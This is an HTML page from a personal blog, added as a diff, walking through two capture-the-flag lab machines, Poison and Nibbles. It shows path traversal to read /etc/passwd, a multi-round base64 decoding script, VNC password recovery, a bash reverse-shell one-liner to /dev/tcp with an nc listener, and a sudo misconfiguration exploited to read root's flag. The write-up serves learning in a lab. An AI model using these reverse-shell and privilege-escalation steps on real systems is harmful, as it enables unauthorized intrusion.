@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Poison - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Poison", url: "#_top", children: [
+              {title: "User", url: "#user" },
+              {title: "Nibbles (User &amp; Rooted)", url: "#nibbles-user-rooted" },
+              {title: "Root", url: "#root_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/require.js"></script>
+      <script src="../../../search/search.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../celestial/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../celestial/" class="btn btn-xs btn-link">
+        Celestial
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../valentine/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../valentine/" class="btn btn-xs btn-link">
+        Valentine
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="poison">Poison</h1>
+<h2 id="user">User</h2>
+<p>So, started with the usual nmap command: 
+<img alt="nmap" src="../images/poison/nmap.png" /></p>
+<p>We have a lot of things to attack. Let's start with the http. </p>
+<p>First page ask you to choose one script.. Let's took <strong>listfiles.php</strong>...</p>
+<p><img alt="scripts" src="../images/poison/scripts.png" /></p>
+<p><img alt="listfiles.php" src="../images/poison/listfiles.png" /></p>
+<p>The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called <strong>pwdbackup.txt</strong>. I'd like to read it.. so.. what happens if we change the file param of the url? </p>
+<p><img alt="pswdbackup" src="../images/poison/passwd_backup.png" /></p>
+<p>Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:</p>
+<pre><code class="python">import base64 
+
+password = &quot;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&quot;
+
+for _ in xrange(13):
+    password = base64.decodestring(password)
+
+print password
+</code></pre>
+
+<p>Once executed.. the answer is: <strong>Charix!2#4%6&amp;8(0</strong>.
+Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. 
+What if we use again the path traversal vuln?:</p>
+<p><img alt="etc passwd" src="../images/poison/etc_passwd.png" /></p>
+<p>Perfect. There is a user called <strong>charix</strong>, due to the password has also that string, I guess is the correct user for our password.
+Let's try an ssh connection: </p>
+<p><img alt="user flag" src="../images/poison/user_flag.png" /></p>
+<h3 id="root">Root</h3>
+<p>Ok, once I started using <strong>LinEnum.sh</strong>, looking for filesystem files, doing enumeration basically. The first thing, is the <strong>secret.zip</strong> file which is placed in the home of charix. </p>
+<p>I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. </p>
+<p>Then, I continued enumerating and discovered some processes running as root listeining only in localhost: </p>
+<p><img alt="process localhost" src="../images/poison/processes_localhost.png" /></p>
+<p>In particular, <strong>Xvnc</strong> and <strong>sendmail</strong> sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. </p>
+<p>So I looked for some commands in the machine (just pressing vnc<TAB>) and found <strong>vncpasswd</strong>. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:</p>
+<p><img alt="vncpasswd and file" src="../images/poison/decrypting_passwd_file.png" /></p>
+<p>So, after "catting" I realise that was more or less the same format as the file that I already decompressed from the ZIP. 
+So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was <a href="https://github.com/jeroennijhof/vncpwd">one</a>.</p>
+<p>After using it, get the password <strong>VNCP@$$!</strong>.</p>
+<p>This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.</p>
+<p>At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:</p>
+<pre><code class="bash">ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84
+</code></pre>
+
+<p>Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: 
+<img alt="remmina" src="../images/poison/remmina_config.png" /></p>
+<p><img alt="root flag" src="../images/poison/root_flag.png" /></p>
+<p>YEAH! I had to copy it char by char xD.</p>
+<h2 id="nibbles-user-rooted">Nibbles (User &amp; Rooted)</h2>
+<h3 id="user_1">User</h3>
+<p>Reading comments. Found</p>
+<pre><code class="html">&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
+</code></pre>
+
+<p>Ran dirbuster against http://10.10.10.75/nibbleblog/ 
+Found <strong>admin.php</strong>.</p>
+<p>Tried with some default credentials:</p>
+<ul>
+<li>admin:admin</li>
+<li>nibbles:nibbles</li>
+<li>admin:nibbles <strong>(GOT IT!)</strong></li>
+</ul>
+<p>Tried to look for a LFI in some upload of images (new page, new post) without luck..</p>
+<p>Search in google for nibbleblog: <strong>It is a well-known CMS!</strong>.. Looking for exploit: YEAH! INside <strong>MSF</strong>.</p>
+<p>Run the exploit:</p>
+<p><img alt="msf_exploit" src="../images/nibbles/msf_exploit.png" /></p>
+<p>Once with the meterpreter.</p>
+<pre><code class="bash">cat /etc/passsd
+</code></pre>
+
+<p>Showed me, that there was only one user interesting called <strong>nibbler</strong>.</p>
+<pre><code class="bash">whoami
+</code></pre>
+
+<p>returned also <strong>nibbler</strong>.</p>
+<p>Went to /home/nibbler and...:
+<img alt="user_flag" src="../images/nibbles/user_flag.png" /></p>
+<h2 id="root_1">Root</h2>
+<p>So, first step was to create a reverse shell.. In order to do that I did:</p>
+<p><strong> On my local machine </strong></p>
+<pre><code class="bash">sudo ufw allow 3333
+nc -lnvp 3333
+</code></pre>
+
+<p><strong> On the remote machine</strong></p>
+<pre><code class="bash">bash -i
+bash -i &gt;&amp; /dev/tcp/IP/3333 0&gt;&amp;1
+</code></pre>
+
+<p><img alt="reverse_shell" src="../images/nibbles/reverse_shell.png" /></p>
+<p>Once I have the reverse shell in my local pc, I "upgraded" to a full tty (I learned this trick by looking this <a href="https://www.youtube.com/watch?v=uc3pMrIbP88">video</a>).</p>
+<p>So next step was use the <strong>LinEnum.sh</strong>. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).</p>
+<p>Once I ran it, one of the outputs was:</p>
+<pre><code class="bash">User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+[+] Possible sudo pwnage!
+-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+
+<p>This basicall means that there is a misconfiguration in the <strong>/etc/sudoers</strong> file which allows the user <strong>nibbler</strong> to execute any <strong>monitor.sh</strong> as root, without prompting any password. So my next step was simply:</p>
+<pre><code class="bash">echo &quot;cat /root/root.txt&quot; &gt; /home/nibbler/personal/stuff/monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+
+<p><strong>It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works</strong></p>
+<p>The output was the flag =):</p>
+<p><img alt="root_flag" src="../images/nibbles/root_flag.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../celestial/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../celestial/" class="btn btn-xs btn-link">
+        Celestial
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../valentine/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../valentine/" class="btn btn-xs btn-link">
+        Valentine
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
